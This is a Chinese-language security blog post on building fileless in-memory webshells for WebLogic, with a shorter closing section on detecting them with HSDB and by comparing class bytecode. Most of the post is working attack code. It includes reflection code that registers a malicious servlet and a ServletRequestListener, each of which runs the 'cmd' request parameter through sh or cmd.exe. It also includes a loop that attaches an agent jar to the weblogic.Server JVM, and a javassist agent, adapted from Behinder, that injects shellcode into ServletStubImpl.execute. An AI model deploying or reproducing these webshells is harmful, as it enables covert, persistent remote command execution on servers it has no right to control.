之前已经实现了Filter内存马，现在继续把其他类型的也看一下



## 0x00 servlet型内存马

搜了一圈网上，没找到weblogic servlet型的内存马，没得参考，只能自己动手了

刚开始看的时候，发现weblogic会先根据请求的数据构造request对象，根据url去servletMapping中找到对应的servletStub，这个时候request中的servletStub已经固定了servlet的处理类

![](/img/in-post/weblogic-memshell-2/1.png)

调用request中workManager的`executeIt`方法

![](/img/in-post/weblogic-memshell-2/2.png)

`executeItInternal`方法，很明显是从空闲的线程池取出一个线程对request数据做处理。当前线程是`weblogic.kernel.ExecuteThread`，而实际执行的线程是`weblogic.work.ExecuteThread`

![](/img/in-post/weblogic-memshell-2/3.png)

基于这个原因，猜测因为在工作线程中无法修改kernel线程的servletMapping所以导致没有servlet的内存马？



但是在工作线程中的context是存在这个servletMapping的。现在来做个试验，看看操作能不能产生影响。就把servletMapping中的matchMap删掉一条匹配规则，这里我删了`/management`

```java
java.lang.reflect.Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
connectionHandlerF.setAccessible(true);
weblogic.servlet.internal.HttpConnectionHandler connectionHandler = (weblogic.servlet.internal.HttpConnectionHandler)connectionHandlerF.get(currentWork);
Object scm = connectionHandler.getHttpServer().getServletContextManager();
Field f = scm.getClass().getDeclaredField("contextTable");
f.setAccessible(true);
weblogic.servlet.utils.ServletMapping servletmapping = (weblogic.servlet.utils.ServletMapping)f.get(scm);
//servletmapping.removePattern("/management");
Field mmf = servletmapping.getClass().getSuperclass().getDeclaredField("matchMap");
mmf.setAccessible(true);
weblogic.utils.collections.MatchMap matchMap = (weblogic.utils.collections.MatchMap)mmf.get(servletmapping);
matchMap.remove("/management");
```

成功删掉了（正常这个接口会弹出框让输入账号密码）
![](/img/in-post/weblogic-memshell-2/4.png)

可能是猜测有问题，先不管这个。那能影响到的话就比较简单了，直接调用context的registerServlet注册servlet即可，最终代码

```java
byte[] codeClass = java.util.Base64.getDecoder().decode("yv66vgAAADQAugoAJwB......");
ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();
java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
define.setAccessible(true);
Class evilFilterClass  = (Class)define.invoke(cl,codeClass,0,codeClass.length);

Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
java.lang.reflect.Method m = executeThread.getDeclaredMethod("getCurrentWork");
Object currentWork = m.invoke(Thread.currentThread());

java.lang.reflect.Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
connectionHandlerF.setAccessible(true);
Object obj = connectionHandlerF.get(currentWork);

java.lang.reflect.Field requestF = obj.getClass().getDeclaredField("request");
requestF.setAccessible(true);
obj = requestF.get(obj);

java.lang.reflect.Field contextF = obj.getClass().getDeclaredField("context");
contextF.setAccessible(true);
Object context = contextF.get(obj);

Method registerServletM = (Method)context.getClass().getDeclaredMethod("registerServlet",String.class,String.class,String.class);
registerServletM.setAccessible(true);
registerServletM.invoke(context,"TestServlet","/TestServlet","TestServlet");

```

恶意servlet

```java
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Scanner;

@WebServlet("/TestServlet")
public class TestServlet extends HttpServlet {

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {
    }
    @Override
    public ServletConfig getServletConfig() {
        return null;
    }
    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        String cmd = servletRequest.getParameter("cmd");
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\a");
        String output = s.hasNext() ? s.next() : "";
        PrintWriter out = servletResponse.getWriter();
        out.println(output);
        out.flush();
        out.close();
    }

    @Override
    public String getServletInfo() {
        return null;
    }
    @Override
    public void destroy() {
    }


}

```

内存马效果
![](/img/in-post/weblogic-memshell-2/5.png)



## 0x01 listener型内存马

首先还是要找出listener的运行机制，在context类里翻的时候，又翻到了之前filter链的地方，可以看到调用了`hasRequestListeners`函数

```java
if (!invocationContext.hasFilters() && !invocationContext.hasRequestListeners()) {
	this.stub.execute(this.req, this.rsp);
} else {
	FilterChainImpl fc = invocationContext.getFilterChain(this.stub, this.req, this.rsp);
    if (fc == null) {
		this.stub.execute(this.req, this.rsp);
	} else {
        fc.doFilter(this.req, this.rsp);
    }
}
```

又调了`EventsManager`的`hasRequestListeners`

```java
public boolean hasRequestListeners() {
	return this.getEventsManager().hasRequestListeners();
}
```

跟进`EventsManager`，可以看到判断`hasRequestListeners`属性是否为`true`

```java
public boolean hasRequestListeners() {
	return this.hasRequestListeners;
}
```

在这里设为`true`了

```java
synchronized <T extends EventListener> void addEventListener(T listener) {
        boolean isListener = false;
        ......
		......
        if (listener instanceof ServletRequestListener) {
            this.addListenterToList(this.requestListeners, (ServletRequestListener)listener);
            this.hasRequestListeners = true;
            isListener = true;
        }
```

context中有一个`registerListener`函数可以触发`addEventListener`

```java
public void registerListener(String listenerClassName) throws DeploymentException {
        this.addListener(listenerClassName);
}
```

先根据类名实例化

```java
public void addListener(String className) {
        EventListener listener = this.eventsManager.createListener(className);
        this.addListener(listener);
}
```

调用`addEventListener`

```java
public <T extends EventListener> void addListener(T t) {
        this.checkContextStarted("addListener");
        this.checkNotifyDynamicContext();
        if (t instanceof ServletContextListener) {
            if (this.phase != WebAppServletContext.ContextPhase.INITIALIZER_STARTUP) {
                weblogic.i18n.logging.Loggable logger = HTTPLogger.logCannotAddServletContextListenerLoggable();
                logger.log();
                throw new IllegalArgumentException(logger.getMessage());
            }

            this.eventsManager.registerDynamicContextListener((ServletContextListener)t);
        } else {
            this.eventsManager.addEventListener(t);
        }

    }
```

注意在`checkContextStarted`和c`heckNotifyDynamicContext`函数中，会判断weblogic当前的状态，状态不对就会抛出异常，不让注册listener

```java
private void checkContextStarted(String caller) {
    if (this.phase == WebAppServletContext.ContextPhase.START) {
        weblogic.i18n.logging.Loggable logger = HTTPLogger.logContextAlreadyStartLoggable(caller);
        logger.log();
        throw new IllegalStateException(logger.getMessage());
    }
}

private void checkNotifyDynamicContext() {
    if (this.phase == WebAppServletContext.ContextPhase.INITIALIZER_NOTIFY_LISTENER) {
        weblogic.i18n.logging.Loggable logger = HTTPLogger.logInvalidServletContextListenerLoggable();
        logger.log();
        throw new UnsupportedOperationException(logger.getMessage());
    }
}
```

跟tomcat是类似的，只需要反射改掉即可，注册完要改回来

```java
Field phaseF = context.getClass().getDeclaredField("phase");
phaseF.setAccessible(true);
phaseF.set(context, weblogic.servlet.internal.WebAppServletContext.ContextPhase.INITIALIZER_STARTUP);
			
Method registerServletM = (Method)context.getClass().getDeclaredMethod("registerListener",String.class);
registerServletM.setAccessible(true);
registerServletM.invoke(context,"EvilListener");

phaseF.set(context, weblogic.servlet.internal.WebAppServletContext.ContextPhase.START);
```

恶意listener，这里实现的是`ServletRequestListener`

```java
import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Scanner;

public class EvilListener implements ServletRequestListener {
    String aa;
    public void requestInitialized(ServletRequestEvent ev) {
        try{
            ServletRequest request = ev.getServletRequest();
            ServletResponse response  = ((weblogic.servlet.internal.ServletRequestImpl)request).getResponse();

            String cmd = request.getParameter("cmd");
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = response.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }catch(Exception ex){
            ex.printStackTrace();
        }
    }

    public void requestDestroyed(ServletRequestEvent ev) {
    }
}
```

虽然registerListener方法调用成功了，但listener似乎没有触发的地方？

实际上listener是依附在filter链上的，在getFilterChain中，如果`hasRequestListeners`为`true`，会往filter链插入一个`reqEventsFilterWrapper`对象

```java
public FilterChainImpl getFilterChain(ServletStub stub, ServletRequest rq, ServletResponse rsp, boolean filterReqEvents, int dispatcher) throws ServletException {
    ServletRequestImpl req = ServletRequestImpl.getOriginalRequest(rq);
    FilterChainImpl fci = null;
    if (filterReqEvents) {
        fci = new FilterChainImpl();
        fci.add(this.reqEventsFilterWrapper);
    }
```

我们注册的listener就在里面

```java
FilterManager
|__ reqEventsFilterWrapper
    |__ filter
    	|__ eventsManager
    		|__ requestListeners
    			|__ EvilListener
```

weblogic用一个特殊的`filter（reqEventsFilterWrapper）`封装了要执行的listener，通过调用`reqEventsFilterWrapper`的`doFilter`方法去触发它

调用`notifyRequestLifetimeEvent`

```java
public void doFilter(ServletRequest req, ServletResponse rsp, FilterChain chain) throws ServletException, IOException {
        ......

        try {
            if (req.getAttribute("requestInitEventNotified") == null) {
                this.eventsManager.notifyRequestLifetimeEvent(req, true);
                req.setAttribute("requestInitEventNotified", Boolean.TRUE.toString());
            }

```

最后遍历调用listener的`requestInitialized`方法

```java
void notifyRequestLifetimeEvent(ServletRequest req, boolean initialized) {
        if (!this.requestListeners.isEmpty()) {
            Thread thread = Thread.currentThread();
            ClassLoader oldClassLoader = null;
            if (thread.getContextClassLoader() != this.context.getServletClassLoader()) {
                oldClassLoader = this.context.pushEnvironment(thread);
            }

            try {
                ServletRequestEvent sre = new ServletRequestEvent(this.context, req);
                ServletRequestListener listener;
                if (initialized) {
                    Iterator var6 = this.requestListeners.iterator();

                    while(var6.hasNext()) {
                        listener = (ServletRequestListener)var6.next();
                        listener.requestInitialized(sre);
                    }
```

访问内存马
![](/img/in-post/weblogic-memshell-2/6.png)

servlet型与listener型内存马查杀与filter类似，这里就不再赘述了



## 0x02 Agent型内存马

这种类型的内存马利用的是java agent。java agent是一种能够在不影响正常编译的情况下，修改字节码的机制，可以把它理解成一种代码注入的方式。像RASP就是用这种方式进行插桩，达到hook的效果

冰蝎中已经集成了weblogic的内存马，下面就用它的代码做分析，因为不涉及其他web服务器，所以删减了一些部分

首先我们需要上传恶意agent的jar包到服务器上，然后在服务器执行这段代码。weblogic的jvm名字是`weblogic.Server`，遍历到这个jvm时，直接调用`loadAgent`加载我们的恶意jar包。`VirtualMachine`在`%JAVA_HOME%/lib/tools.jar`中，找不到类的可以手动加一下

```java
VirtualMachine vm = null;
List<VirtualMachineDescriptor> vmList = null;
String agentFile =  "D:\\EvilFilter.jar";

while (true) {
    try {
        vmList = VirtualMachine.list();
        if (vmList.size() <= 0)
            continue;
        for (VirtualMachineDescriptor vmd : vmList) {

            if (vmd.displayName().indexOf("weblogic.Server") >= 0) {
                vm = VirtualMachine.attach(vmd);

                System.out.println("[+]OK.i find a jvm.");
                Thread.sleep(1000);
                if (null != vm) {
                    vm.loadAgent(agentFile, "");
                    System.out.println("[+]memeShell is injected.");
                    vm.detach();
                    return;
                }
            }
        }
        Thread.sleep(3000);
    } catch (Exception e) {
        e.printStackTrace();
    }
}
```

关键是java agent，入口是agentmain函数，跟普通的main函数一样

```java
public static void agentmain(String args, Instrumentation inst){
        Class<?>[] cLasses = inst.getAllLoadedClasses();
        ClassPool cPool = ClassPool.getDefault();
        byte[] data = new byte[0];
        Map<String, Map<String, Object>> targetClasses = new HashMap<String, Map<String, Object>>();
        Map<String, Object> targetClassWeblogicMap = new HashMap<String, Object>();
        targetClassWeblogicMap.put("methodName", "execute");
        List<String> paramWeblogicClsStrList = new ArrayList<String>();
        paramWeblogicClsStrList.add("javax.servlet.ServletRequest");
        paramWeblogicClsStrList.add("javax.servlet.ServletResponse");
        targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
        targetClasses.put("weblogic.servlet.internal.ServletStubImpl", targetClassWeblogicMap);

        String shellCode = "javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession session = request.getSession();\nString pathPattern=\"%s\";\nif (request.getRequestURI().matches(pathPattern))........[java code]";
        for (Class<?> cls : cLasses) {
            if (targetClasses.keySet().contains(cls.getName())) {
                String targetClassName = cls.getName();
                try {
                    String path = "/hack";//new String(base64decode(args.split("\\|")[0]));
                    String key = "e45e329feb5d925b";//new String(base64decode(args.split("\\|")[1]));
                    shellCode = String.format(shellCode, new Object[] { path, key });
                    if (targetClassName.equals("jakarta.servlet.http.HttpServlet"))
                        shellCode = shellCode.replace("javax.servlet", "jakarta.servlet");
                    ClassClassPath classPath = new ClassClassPath(cls);
                    cPool.insertClassPath((ClassPath)classPath);
                    cPool.importPackage("java.lang.reflect.Method");
                    cPool.importPackage("javax.crypto.Cipher");
                    List<CtClass> paramClsList = new ArrayList<CtClass>();
                    for (String clsName : (List<String>)((Map)targetClasses.get(targetClassName)).get("paramList"))
                        paramClsList.add(cPool.get(clsName));
                    CtClass cClass = cPool.get(targetClassName);
                    String methodName = ((Map)targetClasses.get(targetClassName)).get("methodName").toString();
                    CtMethod cMethod = cClass.getDeclaredMethod(methodName, paramClsList.<CtClass>toArray(new CtClass[paramClsList.size()]));
                    cMethod.insertBefore(shellCode);
                    cClass.detach();
                    data = cClass.toBytecode();
                    inst.redefineClasses(new ClassDefinition[] { new ClassDefinition(cls, data) });
                } catch (Exception e) {
                    e.printStackTrace();
                } catch (Error error) {
                    error.printStackTrace();
                }
            }
        }
```

获取所有加载的类

```java
Class<?>[] cLasses = inst.getAllLoadedClasses();
```

冰蝎选择对`weblogic.servlet.internal.ServletStubImpl`的`execute`进行注入，从之前的分析可以知道，weblogic对每一个servlet都有对应的setvletStub对象做处理，最终会调用这个servletStub的execute函数。也可以注入到其他http请求的并经之路比如`getFilterChain`函数之类的

```java
FilterChainImpl fc = invocationContext.getFilterChain(this.stub, this.req, this.rsp);
    if (fc == null) {
		this.stub.execute(this.req, this.rsp);
```

获取前面指定的Method对象（`weblogic.servlet.internal.ServletStubImpl`的`execute`方法）

```java
for (String clsName : (List<String>)((Map)targetClasses.get(targetClassName)).get("paramList"))
	paramClsList.add(cPool.get(clsName));
CtClass cClass = cPool.get(targetClassName);
String methodName = ((Map)targetClasses.get(targetClassName)).get("methodName").toString();
CtMethod cMethod = cClass.getDeclaredMethod(methodName, paramClsList.<CtClass>toArray(new CtClass[paramClsList.size()]));
```

调用`insertBefore`把恶意代码插到方法前面

```java
cMethod.insertBefore(shellCode);
```

最后调用`redefineClasses`重新定义类，到这里就已经成功注入了

```java
inst.redefineClasses(new ClassDefinition[] { new ClassDefinition(cls, data) });
```



如何找到这种内存马？

第一种思路，我们的java agent在attach上去的时候，对应的agent类也是会加载到jvm里面的，所以通过一个java自带的HSDB工具（HotSpot Debugger，专门用于调试HotSpot VM 的调试器），可以很明显的找出来，具体操作参考[这篇文章](https://zzcoder.cn/2019/12/06/HSDB%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98/)

通过以下命令运行HSDB

```pow
java -classpath "%JAVA_HOME%/lib/sa-jdi.jar" sun.jvm.hotspot.HSDB
```

在Class Browser中可以看到我们的Agent类就在第一行，查看Agent类中的变量就能发现我们的动态插入的java代码，然后把这个类的class文件dump出来，就能找到攻击者把恶意代码插在了哪个类函数中

![](/img/in-post/weblogic-memshell-2/7.png)

第二种思路，我们可以点Class Browser的`Create .class for all classes`把所有加载的类导出来，反编译其中的`ServletStubImpl.class`，可以看到已经被修改了的

![](/img/in-post/weblogic-memshell-2/8.png)

然后我们在jsp中调用`getResourceAsStream`读取磁盘上的`ServletStubImpl.class`

```java
String jarname = "/weblogic/servlet/internal/ServletStubImpl.class";
InputStream is = weblogic.servlet.internal.ServletStubImpl.class.getResourceAsStream(jarname);
ByteArrayOutputStream bytestream = new ByteArrayOutputStream();
int ch;
byte b[] = null;
while ((ch = is.read()) != -1) {
	bytestream.write(ch);
}
b = bytestream.toByteArray();
FileOutputStream fos = new FileOutputStream(new File("D:\\a.class"));
fos.write(b);
fos.close();
```

反编译`a.class`，这里的`ServletStubImpl`还是原来的代码

![](/img/in-post/weblogic-memshell-2/9.png)

所以通过对比每个类的类字节码，就能知道哪个类被修改了；如果对比之后过滤出某个http处理流程中会触发的类，就可以基本上确定是这个类被注入内存马了（但也有可能是RASP之类的插桩，所以需要进一步确认）

查杀的话只需要写个java agent刷新对应的类即可，因为磁盘上的class文件是没有被改动的



## 0x03 参考

[https://panicall.github.io/2020/01/24/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90.html](https://panicall.github.io/2020/01/24/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90.html)

[https://www.mdeditor.tw/pl/gHKR/zh-tw](https://www.mdeditor.tw/pl/gHKR/zh-tw)

[https://github.com/rebeyond/Behinder](https://github.com/rebeyond/Behinder)

[https://zzcoder.cn/2019/12/06/HSDB%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98/](https://zzcoder.cn/2019/12/06/HSDB%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98/)

